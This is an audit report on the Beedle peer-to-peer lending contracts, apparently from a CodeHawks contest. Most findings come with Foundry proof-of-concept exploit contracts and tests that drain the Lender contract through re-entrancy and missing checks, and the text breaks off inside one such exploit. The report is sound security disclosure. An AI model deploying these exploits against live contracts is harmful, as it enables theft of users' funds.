<img src="https://res.cloudinary.com/droqoz7lg/image/upload/q_90/dpr_1.75/c_fill,g_auto,h_320,w_320/f_auto/v1/company/is0wiwcjnvzbnesiipsi?_a=BATCr5AA0" width=100 height=100>

# [Beedle](https://www.codehawks.com/contests/clkbo1fa20009jr08nyyf9wbx)

| Protocol | Website | Twitter | Contest Pot | nSLOC | Length | Start | End |
|:--:|:--:|:--:|:--:|:--:|:--:|:--:|:--:|
| Beedle | [Website](https://swap.beedle.fi/) | [Twitter](https://twitter.com/beedlefi) | $20,000 USDC | 706 | 14 days | Jul 24, 2023 | Aug 7, 2023 |

## What is CodeHawks Beedle?

Oracle free peer to peer perpetual lending

Before diving into the codebase and this implementation of the Blend lending protocol, it is recommended that you read the [original paper by Paradigm and Blur](https://www.paradigm.xyz/2023/05/blend#continuous-loans)

## Audit scope

- [Beedle.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Beedle.sol)
- [Fees.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Fees.sol)
- [Lender.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Lender.sol)
- [Staking.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/Staking.sol)
- [utils/Errors.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Errors.sol)
- [utils/Ownable.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Ownable.sol)
- [utils/Structs.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/utils/Structs.sol)
- [interfaces/IERC20.so](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/IERC20.sol)
- [interfaces/ISwapRouter.sol](https://github.com/Cyfrin/2023-07-beedle/blob/main/src/interfaces/ISwapRouter.sol)
  
## Issues found by MiniGlome

| Severity | Title | Count |
|:--|:--|:--:|
| High | `borrow` function can be frontrun by lender to put `auctionLength` to 1 | [H-01] |
| High | Contract can be drained by lack of pool ownership check in `buyLoan` | [H-02] |
| High | `Contract can be drained by lack of token address check in `buyLoan` | [H-03] |
| High | `Lender` contract can be drained by re-entrancy in `refinance` (collateral) | [H-04] |
| High | `Lender` contract can be drained by re-entrancy in `refinance` (debt) | [H-05] |
| High | `Lender` contract can be drained by re-entrancy in `repay` | [H-06] |
| High | `Lender` contract can be drained by re-entrancy in `seizeLoan` | [H-07] |
| High | `Lender` contract can be drained by re-entrancy in `setPool` | [H-08] |
| High | Lender loses money when a loan is refinanced | [H-09] |
| High | `sellProfits` function does not work because of lack of approved tokens | [H-10] |
| Medium | Borrower can reset auction to not get liquidated | [M-01] |

# [H-01] - `borrow` function can be frontrun by lender to put `auctionLength` to 1

## Summary
THe `borrow` function can be frontrun by a malicious lender to put the `auctionLength` of the lending pool to `1` which will allow the lender to immediately liquidate the new borrower.

## Vulnerability Details
When someone wants to take a loan they have the call the `borrow` function with the `poolId` they want to borrow from. The lender of this pool could be watching the mempool and decide to call the `setPool` function to update their pool with the minimum amount of `auctionLength` which is `1` (i.e. 1 second). With higher gas fees this transaction will be executed before the borrower's.

```solidity
File: Lender.sol

L130:	function setPool(Pool calldata p) public returns (bytes32 poolId) {
        // validate the pool
        if (
            p.lender != msg.sender ||
            p.minLoanSize == 0 ||
            p.maxLoanRatio == 0 ||
            p.auctionLength == 0 ||
            p.auctionLength > MAX_AUCTION_LENGTH ||
            p.interestRate > MAX_INTEREST_RATE
        ) revert PoolConfig();
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L130

```solidity
File: Lender.sol

L232:	function borrow(Borrow[] calldata borrows) public { // @audit - Can be frontrun by lender to put `auctionLength` to 1
        for (uint256 i = 0; i < borrows.length; i++) {
            bytes32 poolId = borrows[i].poolId;
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L232

The malicious lender can then put the loan up for auction by calling `startAuction`. The auction will end at the next mined block which doesn't let any one the time to buy it. The lender can then call `seizeLoan` to liquidate the newly created loan and receive the collateral.

## Impact
Lenders can immeditely liquidate new loans to steal borrower's collateral.

## Tools Used
Manual review + Foundry

## Recommendations
Have a minimal `auctionLength` amount, for example 1 day. In addition, a delay can be added when updating existing pools.


# [H-02] - Contract can be drained by lack of pool ownership check in `buyLoan`
## Summary
In the `buyLoan` function, there is no check that the caller owns pool where the debt is transfered to, resulting in funds being stolen.

## Vulnerability Details
When a loan is put up for auction, anyone can call the `buyLoan` function which transfers the debt to another pool without checking that the caller owns the new pool.

```solidity
File: Lender.sol

L517:	// update the loan with the new info
L518:	loans[loanId].lender = msg.sender; // @audit - No check that msg.sender owns the pool
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L518

Hence, a malicious actor can:
1. Create a pool
2. Take a loan in his own pool
3. Put the loan for auction
4. Call `buyLoan` to transfer the debt to a similar pool
5. Repeat steps (2)(3)(4)
6. Keep all the profit

## Impact
All tokens from the `lender` contract can be stolen. This is a critical issue.
### POC
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    // Setup
    address attacker = address(0x5);
    loanToken.mint(address(attacker), 1_000*10**18);
    collateralToken.mint(address(attacker), 2);
    
    vm.startPrank(lender1);
    // lender1 creates a pool of loanTokens
    Pool memory p = Pool({
        lender: lender1,
        loanToken: address(loanToken),
        collateralToken: address(collateralToken),
        minLoanSize: 10*10**18,
        poolBalance: 1000*10**18,
        maxLoanRatio: 2*10**18,
        auctionLength: 1 days,
        interestRate: 1000,
        outstandingLoans: 0
    });
    bytes32 poolId = lender.setPool(p);

    // Before the exploit
    assertEq(collateralToken.balanceOf(address(lender)), 0);
    assertEq(loanToken.balanceOf(address(lender)), 1_000*10**18);       // Lender has 1_000 loanToken
    assertEq(collateralToken.balanceOf(address(attacker)), 2);          // Attacker has 2 wei of collateral token  
    assertEq(loanToken.balanceOf(address(attacker)), 1_000*10**18);     // Attacker has 1_000 loanToken

    // Exploit starts here
    vm.startPrank(attacker);
    // (1) Create a pool
    loanToken.approve(address(lender), 1_000*10**18);
    Pool memory attackerPool = Pool({
        lender: attacker,
        loanToken: address(loanToken),
        collateralToken: address(collateralToken),
        minLoanSize: 1,
        poolBalance: 1000*10**18,
        maxLoanRatio: type(uint256).max,
        auctionLength: 5 minutes,
        interestRate: 0,
        outstandingLoans: 0
    });
    bytes32 attackerPoolId = lender.setPool(attackerPool);
    // (2) Take a loan in his own pool
    collateralToken.approve(address(lender), 2);
    Borrow memory b = Borrow({
        poolId: attackerPoolId,
        debt: 1_000*10**18,
        collateral: 1
    });
    Borrow[] memory borrows = new Borrow[](1);
    borrows[0] = b;        
    lender.borrow(borrows); // Attacker has now 995*10**18 loanTokens
    assertEq(loanToken.balanceOf(address(attacker)), 995*10**18);
    // (3) Put the loan for auction
    uint256 loanId = 0;
    uint256[] memory loanIds = new uint256[](1);
    loanIds[0] = loanId;
    lender.startAuction(loanIds);
    // (4) Call `buyLoan` to transfer the debt to lender1's pool
    // Wait 2 minutes
    vm.warp(block.timestamp + 2 minutes);
    lender.buyLoan(loanId, poolId);
    // (5) Take another loan in his own pool      
    lender.borrow(borrows);

    // After the exploit
    assertEq(collateralToken.balanceOf(address(lender)), 2);
    assertEq(loanToken.balanceOf(address(lender)), 0);              // Lender contract has been drained
    assertEq(collateralToken.balanceOf(address(attacker)), 0); 
    assertEq(loanToken.balanceOf(address(attacker)), 1_990*10**18); // Attacker stole all the tokens (-0.5% of fee)
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Check that `msg.sender` is the owner of the pool `poolId`. Add this check at the top of the `buyLoan` function:
```solidity
if (msg.sender != pool[poolId].lender)
	revert NotPoolOwner();
```

# [H-03] - Contract can be drained by lack of token address check in `buyLoan`

## Summary
In the `buyLoan` function, there is no check that the new pool accepts the same tokens as the original one. This can result in loans being transfered to pools filled with worthless tokens and funds being drained from the contract.

## Vulnerability Details
When a loan is put up for auction, anyone can call the `buyLoan` function which transfers the debt to another pool without checking that the new pool accepts the same tokens.

```solidity
File: Lender.sol

L484:	// reject if the pool is not big enough
        uint256 totalDebt = loan.debt + lenderInterest + protocolInterest;
        if (pools[poolId].poolBalance < totalDebt) revert PoolTooSmall();
        // @audit - No check that loanToken is the same
        // if they do have a big enough pool then transfer from their pool
        _updatePoolBalance(poolId, pools[poolId].poolBalance - totalDebt);
        pools[poolId].outstandingLoans += totalDebt;

        // now update the pool balance of the old lender
        bytes32 oldPoolId = getPoolId(
            loan.lender,
            loan.loanToken,
            loan.collateralToken
        );
        _updatePoolBalance(
            oldPoolId,
            pools[oldPoolId].poolBalance + loan.debt + lenderInterest
        );
        pools[oldPoolId].outstandingLoans -= loan.debt;
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L498

## Impact
All tokens from the `lender` contract can be stolen. This is a critical issue.
### POC
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    // Setup
    address attacker = address(0x5);
    loanToken.mint(address(attacker), 1_000*10**18); // This could be done by a flash loan
    loanToken.mint(address(lender), 1_000*10**18);

    // Before the exploit
    assertEq(loanToken.balanceOf(address(lender)), 1_000*10**18);       // Lender has 1_000 loanToken
    assertEq(loanToken.balanceOf(address(attacker)), 1_000*10**18);     // Attacker has 1_000 loanToken

    // Exploit starts here
    vm.startPrank(attacker); // Attacker wants to steal loanTokens from the pool
    // (1) Create a worthless tokens
    TERC20 fakeToken = new TERC20();
    fakeToken.mint(address(attacker), 1_000_000*10**18);
    fakeToken.approve(address(lender), 1_000_000*10**18);
    // (2) Create a pool
    loanToken.approve(address(lender), 1_000*10**18);
    Pool memory attackerPool = Pool({
        lender: attacker,
        loanToken: address(loanToken),
        collateralToken: address(fakeToken),
        minLoanSize: 1,
        poolBalance: 1_000*10**18,
        maxLoanRatio: type(uint256).max,
        auctionLength: 1 days,
        interestRate: 0,
        outstandingLoans: 0
    });
    bytes32 attackerPoolId = lender.setPool(attackerPool);
    // (3) Take a loan in his own pool
    Borrow memory b = Borrow({
        poolId: attackerPoolId,
        debt: 1_000*10**18,
        collateral: 1
    });
    Borrow[] memory borrows = new Borrow[](1);
    borrows[0] = b;        
    lender.borrow(borrows);
    // (4) Put the loan up for auction
    uint256 loanId = 0;
    uint256[] memory loanIds = new uint256[](1);
    loanIds[0] = loanId;
    lender.startAuction(loanIds);
    // (5) Zapbuy the loan with a pool full of fake tokens
    Pool memory fakePool = Pool({
        lender: attacker,
        loanToken: address(fakeToken),
        collateralToken: address(fakeToken),
        minLoanSize: 1,
        poolBalance: 1_000*10**18,
        maxLoanRatio: type(uint256).max,
        auctionLength: 1 days,
        interestRate: 0,
        outstandingLoans: 0
    });
    lender.zapBuyLoan(fakePool, loanId);
    // (6) Remove loanTokens form the first pool
    lender.removeFromPool(attackerPoolId, 1_000*10**18);

    // After the exploit
    assertEq(loanToken.balanceOf(address(lender)), 0);              // Lender contract has been drained
    assertEq(loanToken.balanceOf(address(attacker)), 1_995*10**18); // Attacker stole all the tokens (minus fees)
}
```
Note that attacker needs the same amount of token as the amount being stolen, but the exploit can be done in one transaction so the atack can be founded by a flashloan.

## Tools Used
Manual review + Foundry

## Recommendations
Check that new pool accepts the same tokens as the loan. Add this check at the top of the `buyLoan` function:
```solidity
Loan memory loan = loans[loanId];
Pool memory pool = pool[poolId];
if (pool.loanToken != loan.loanToken || pool.collateralToken != loan.collateralToken)
	revert WrongTokens();
```


# [H-04] - `Lender` contract can be drained by re-entrancy in `refinance` (collateral)
## Summary
Tokens allowing reentrant calls on transfer can be drained from a pool.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `refinance` function. When the new `collateral` is less than the current loan collateral, the difference is sent to the borrower before updating the state.
```solidity
File: Lender.Sol

L668:	} else if (collateral < loan.collateral) {
		// transfer the collateral tokens from the contract to the borrower
		IERC20(loan.collateralToken).transfer(
			msg.sender,
			loan.collateral - collateral
		); // @audit - Re-entrancy can drain contract
	}
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L670


## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit1.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit1  {
    Lender lender;
    address loanToken;
    address collateralToken;
    Refinance refinance;

    constructor(Lender _lender, address _loanToken, address _collateralToken) {
        lender = _lender;
        loanToken = _loanToken;
        collateralToken = _collateralToken;
    }

    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newCollateral) external {
        // [1] Borrow a new loan
        ERC20(collateralToken).approve(address(lender), _collateral);
        Borrow memory b = Borrow({
            poolId: _poolId,
            debt: _debt,
            collateral: _collateral
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // [2] Refinance the loan with a lower amount of collateral
        refinance = Refinance({
            loanId: _loanId,
            poolId: _poolId,
            debt: _debt,
            collateral: _newCollateral
        });
        Refinance[] memory refinances = new Refinance[](1);
        refinances[0] = refinance;
        lender.refinance(refinances);
        // [3] Send the funds back to the attacker
        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 amount) external {
        require(msg.sender == collateralToken, "not collateral token");
        if (from == address(lender)) {
            uint256 lenderBalance = ERC20(collateralToken).balanceOf(address(lender));
            if (lenderBalance > 0) {
                // Re-enter
                Refinance[] memory refinances = new Refinance[](1);
                if (lenderBalance >= amount) {
                    refinances[0] = refinance;
                } else {
                    Refinance memory r = refinance;
                    r.collateral += amount - lenderBalance;
                    refinances[0] = r;
                }
                lender.refinance(refinances);
            }          
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    address attacker = address(0x5);
    // Setup
    vm.startPrank(lender1);
    WeirdToken weirdToken = new WeirdToken(1_000_000*10**18);
    weirdToken.transfer(address(lender), 900_000*10**18); // Lender contract has 900_000 weirdToken
    weirdToken.transfer(address(attacker), 100_000*10**18); // Attacker has 100_000 weirdToken
    // lender1 creates a pool of loanTokens accepting weirdTokens as collateral
    Pool memory p = Pool({
        lender: lender1,
        loanToken: address(loanToken),
        collateralToken: address(weirdToken),
        minLoanSize: 10*10**18,
        poolBalance: 1000*10**18,
        maxLoanRatio: 2*10**18,
        auctionLength: 1 days,
        interestRate: 1000,
        outstandingLoans: 0
    });
    bytes32 poolId = lender.setPool(p);

    assertEq(weirdToken.balanceOf(address(lender)), 900_000*10**18);
    assertEq(loanToken.balanceOf(address(lender)), 1_000*10**18);
    assertEq(weirdToken.balanceOf(address(attacker)), 100_000*10**18);  // Attacker starts with some weirdTokens        
    assertEq(loanToken.balanceOf(address(attacker)), 0);

    // Exploit starts here
    vm.startPrank(attacker);
    Exploit1 attackContract = new Exploit1(lender, address(loanToken), address(weirdToken));
    weirdToken.transfer(address(attackContract), 100_000*10**18);
    uint256 debt = 10*10**18;
    uint256 collateral = 100_000*10**18;
    uint256 loanId = 0;
    uint256 newCollateral = 10*10**18;
    attackContract.attack(poolId, debt, collateral, loanId, newCollateral);

    // Pool has been drained
    assertEq(weirdToken.balanceOf(address(lender)), 0);
    assertLt(loanToken.balanceOf(address(lender)), 1_000*10**18);        // Pool has a debt
    assertEq(weirdToken.balanceOf(address(attacker)), 1_000_000*10**18); // Attacker has drained all the weirdTokens   
    assertGt(loanToken.balanceOf(address(attacker)), 0);                 // Attacker keeps the loan tokens
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan variables before transfering the funds AND use nonReentrant modifiers



# [H-05] - `Lender` contract can be drained by re-entrancy in `refinance` (debt)


## Summary
Tokens allowing reentrant calls on transfer can be drained from a pool.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `refinance` function. When the new `debt` is more than the current loan debt, the difference is sent to the borrower before updating the state.
```solidity
File: Lender.Sol

L647:	} else if (debtToPay < debt) {
 		// we have excess loan tokens so we give some back to the borrower
		// first we take our borrower fee
		uint256 fee = (borrowerFee * (debt - debtToPay)) / 10000;
		IERC20(loan.loanToken).transfer(feeReceiver, fee);
		// transfer the loan tokens from the contract to the borrower
		IERC20(loan.loanToken).transfer(msg.sender, debt - debtToPay - fee); // @audit - Re-entrancy can drain pool
	}
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L653


## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit2.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit2  {
    Lender lender;
    address loanToken;
    address collateralToken;
    bool borrowed;
    Refinance refinance;
    uint256 i;

    constructor(Lender _lender, address _loanToken, address _collateralToken) {
        lender = _lender;
        loanToken = _loanToken;
        collateralToken = _collateralToken;
    }

    function attack(bytes32 _poolId, uint256 _debt, uint256 _collateral, uint256 _loanId, uint256 _newDebt) external {
        // [1] Borrow a new loan
        ERC20(collateralToken).approve(address(lender), _collateral);
        Borrow memory b = Borrow({
            poolId: _poolId,
            debt: _debt,
            collateral: _collateral
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        borrowed = true;
        // [2] Refinance the loan with a higher amount of debt
        refinance = Refinance({
            loanId: _loanId,
            poolId: _poolId,
            debt: _newDebt,
            collateral: _collateral
        });
        Refinance[] memory refinances = new Refinance[](1);
        refinances[0] = refinance;
        lender.refinance(refinances);
        // [3] Repay the loan
        ERC20(loanToken).approve(address(lender), _newDebt);
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = _loanId;
        lender.repay(loanIds);
        // [4] Send the funds back to the attacker
        ERC20(loanToken).transfer(msg.sender, ERC20(loanToken).balanceOf(address(this)));
        ERC20(collateralToken).transfer(msg.sender, ERC20(collateralToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 /*amount*/) external {
        require(msg.sender == loanToken, "not collateral token");
        if (from == address(lender) && borrowed) {
            // Re-enter 4 times
            if (i < 4) {
                i = i + 1;
                Refinance[] memory refinances = new Refinance[](1);
                refinances[0] = refinance;
                lender.refinance(refinances);                
            }            
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    // Setup
    address attacker = address(0x5);
    collateralToken.mint(address(attacker), 100*10**18); 
    
    vm.startPrank(lender1);
    WeirdToken weirdToken = new WeirdToken(1_000*10**18); 
    weirdToken.approve(address(lender), 1_000*10**18);
    // lender1 creates a pool of weirdTokens accepting collateralToken as collateral
    Pool memory p = Pool({
        lender: lender1,
        loanToken: address(weirdToken),
        collateralToken: address(collateralToken),
        minLoanSize: 10*10**18,
        poolBalance: 1000*10**18,
        maxLoanRatio: 2*10**18,
        auctionLength: 1 days,
        interestRate: 1000,
        outstandingLoans: 0
    });
    bytes32 poolId = lender.setPool(p);

    // Before the exploit
    assertEq(collateralToken.balanceOf(address(lender)), 0);
    assertEq(weirdToken.balanceOf(address(lender)), 1_000*10**18);      // Lender has 1_000 weirdTokens to lend
    assertEq(collateralToken.balanceOf(address(attacker)), 100*10**18); // Attacker has 100 collateral tokens  
    assertEq(weirdToken.balanceOf(address(attacker)), 0);               // Attacker has no weirdTokens

    // Exploit starts here
    vm.startPrank(attacker);
    Exploit2 attackContract = new Exploit2(lender, address(weirdToken), address(collateralToken));
    collateralToken.transfer(address(attackContract), 100*10**18);
    uint256 debt = 10*10**18;
    uint256 collateral = 100*10**18;
    uint256 loanId = 0;
    uint256 newDebt = 100*10**18;
    attackContract.attack(poolId, debt, collateral, loanId, newDebt);

    // After the exploit
    assertEq(collateralToken.balanceOf(address(lender)), 0);
    assertLt(weirdToken.balanceOf(address(lender)), 650*10**18);        // Pool lost some weirdTokens
    assertEq(collateralToken.balanceOf(address(attacker)), 100*10**18); // Attacker keept his collateralTokens
    assertGt(weirdToken.balanceOf(address(attacker)), 350*10**18);      // Attacker stole some weirdTokens
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the loan debt before transfering the excess loan tokens AND use nonReentrant modifiers


# [H-06] - `Lender` contract can be drained by re-entrancy in `repay`


## Summary
An attacker can craft a token allowing reentrant calls on transfer to drain any token from the `Lender` contract.

## Vulnerability Details
The `Lender` contract allows any token as `loanToken` and the `repay` function transfers the tokens before deleting the loan which result in a re-entrancy vulnerability. A malicious actor can craft a token allowing reentrant calls on transfer to exploit the re-entrancy vulnerability in the `repay` function and get more than one time his collateral back.

```solidity
File: Lender.Sol

L316:	// transfer the loan tokens from the borrower to the pool
            IERC20(loan.loanToken).transferFrom( // @audit - Re-entrancy can drain contract
                msg.sender,
                address(this),
                loan.debt + lenderInterest
            );
            // transfer the protocol fee to the fee receiver
            IERC20(loan.loanToken).transferFrom(
                msg.sender,
                feeReceiver,
                protocolInterest
            );
            // transfer the collateral tokens from the contract to the borrower
            IERC20(loan.collateralToken).transfer(
                loan.borrower,
                loan.collateral
            );
            emit Repaid(
                msg.sender,
                loan.lender,
                loanId,
                loan.debt,
                loan.collateral,
                loan.interestRate,
                loan.startTimestamp
            );
            // delete the loan
            delete loans[loanId];
        }
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L317


## Impact
All tokens can be drained from the contract. This is a critical vulnerability.
### POC
An attacker can use the following exploit contracts to drain the `lender` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract ExploitToken is ERC20 {
    address owner;
    constructor(uint256 amount) ERC20("ExploitToken", "ET") {
        owner = msg.sender;
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        (bool status,) = owner.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        require(status, "call failed");
    }
}
```

```solidity
File: Exploit7.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ExploitToken} from "./ExploitToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit7  {
    Lender lender;
    address collateralToken;
    ExploitToken exploitToken;
    bool loanBorrowed;
    uint256 i;

    constructor(Lender _lender, address _collateralToken) {
        lender = _lender;
        collateralToken = _collateralToken;
    }

    function attack(address _collateralToken) external {
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        // (1) Mint exploitToken
        exploitToken = new ExploitToken(1_000_000_000*10*18);
        ERC20(exploitToken).approve(address(lender), type(uint256).max);
        // (2) Create a pool of exploitTokens
         Pool memory pool = Pool({
            lender: address(this),
            loanToken: address(exploitToken),
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 1_000_000*10*18,
            maxLoanRatio: type(uint256).max,
            auctionLength: 1 days,
            interestRate: 0,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(pool);
        // (3) Take a loan of exploitTokens
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (4) Take another loan of exploitTokens to increase poolBalance
        b = Borrow({
            poolId: poolId,
            debt: 1_000,
            collateral: 1
        });
        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        loanBorrowed = true;
        // (5) Repay the loan
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.repay(loanIds);
        // (7) Send the funds back to the attacker
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));   
    }

    function tokensReceived(address from, address to, uint256 /*amount*/) external {
        if (msg.sender == address(exploitToken)) {
            if (from == address(this) && to == address(lender) && loanBorrowed) {
                // (6) Re-enter the `repay` function (10 times for POC); 
                if (i < 10) {
                    i = i + 1;                    
                    uint256 loanId = 0;
                    uint256[] memory loanIds = new uint256[](1);
                    loanIds[0] = loanId;
                    lender.repay(loanIds);
                }          
            }
        }        
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit7() public {
	address attacker = address(0x5);
	// Setup
	collateralToken.transfer(address(lender), 10_000*10**18);
	collateralToken.transfer(address(attacker), 1_000*10**18 + 1); 

	// Before the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 10_000*10**18);  // Lender contract has 10_000 collateralToken
	assertEq(collateralToken.balanceOf(address(attacker)), 1_000*10**18 + 1); // Attacker has 1_000 collateralToken

	// Exploit starts here
	vm.startPrank(attacker); // Attacker wants to drain all collateralTokens from the contract        
	Exploit7 attackContract = new Exploit7(lender, address(collateralToken));
	collateralToken.transfer(address(attackContract), 1_000*10**18 + 1);
	attackContract.attack(address(collateralToken));

	// After the exploit
	assertEq(collateralToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
	assertEq(collateralToken.balanceOf(address(attacker)), 11_000*10**18); // Attacker has stolen all the 10_000 collateralToken
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by deleting the loan `loans[loanId]` before transfering the funds AND use nonReentrant modifiers


# [H-07] - `Lender` contract can be drained by re-entrancy in `seizeLoan`


## Summary
Tokens allowing reentrant calls on transfer can be drained from the contract.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `seizeLoan` function. When the a loan is put up for auction and the auction finishes, the `collateral` can be collected by the lender, the `collateralToken` are sent to the lender before updating the state.
```solidity
File: Lender.Sol

L565:	IERC20(loan.collateralToken).transfer( // @audit - Re-entrancy can drain the contract
        loan.lender,
        loan.collateral - govFee
    );

    bytes32 poolId = keccak256(
        abi.encode(loan.lender, loan.loanToken, loan.collateralToken)
    );

    // update the pool outstanding loans
    pools[poolId].outstandingLoans -= loan.debt;

    emit LoanSiezed(
        loan.borrower,
        loan.lender,
        loanId,
        loan.collateral
    );
    // delete the loan
    delete loans[loanId];
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L565

An attacker can take a loan in his own pool and seize it, then the hook on token transfer allows him to re-enter the `seizeLoan` function to extract another time the collateral amount from the contract.

## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit6.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit6  {
    Lender lender;
    address loanToken;
    bool auctionEnded;
    bytes32 attackerPoolId;

    constructor(Lender _lender, address _loanToken) {
        lender = _lender;
        loanToken = _loanToken;
    }

    function attackPart1(address _loanToken, address _collateralToken) external {
        ERC20(_loanToken).approve(address(lender), type(uint256).max);
        ERC20(_collateralToken).approve(address(lender), type(uint256).max);
        // (1) Create a new pool        
        Pool memory pool = Pool({
            lender: address(this),
            loanToken: _loanToken,
            collateralToken: _collateralToken,
            minLoanSize: 1,
            poolBalance: 100,
            maxLoanRatio: type(uint256).max,
